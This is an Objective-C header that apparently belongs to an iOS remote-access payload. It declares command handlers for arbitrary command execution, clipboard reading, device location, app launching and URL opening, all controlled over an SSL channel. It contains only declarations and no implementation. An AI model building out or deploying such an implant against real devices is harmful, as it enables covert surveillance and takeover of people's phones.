/*
* MIT License
*
* Copyright (c) 2020-2022 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#import <Foundation/Foundation.h>

#import <CoreLocation/CoreLocation.h>
#import <CoreFoundation/CFUserNotification.h>

#import <AVFoundation/AVFoundation.h>
#import <AudioToolbox/AudioToolbox.h>
#import <MediaPlayer/MediaPlayer.h>

#include <openssl/ssl.h>

#import "external/SpringBoardServices.h"
#import "external/NSTask.h"
#import "external/bootstrap.h"

#import "channel.h"

@interface Commands : NSObject <AVAudioRecorderDelegate> {
    @public

    SSL *channelPipe;
}

CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);
extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);

@property(retain) NSFileManager *fileManager;
@property(retain) UIDevice *thisUIDevice;

-(void)cmd_sysinfo;
-(void)cmd_getpid;
-(void)cmd_getpaste;
-(void)cmd_battery;
-(void)cmd_getvol;
-(void)cmd_locate;
-(void)cmd_vibrate;
-(void)cmd_bundleids;

-(void)cmd_exec:(NSString *)command;
-(void)cmd_say:(NSString *)message;
-(void)cmd_setvol:(NSString *)level;
-(void)cmd_player:(NSString *)action;
-(void)cmd_openapp:(NSString *)bundleID;
-(void)cmd_openurl:(NSString *)url;
-(void)cmd_chdir:(NSString *)directory;

@end
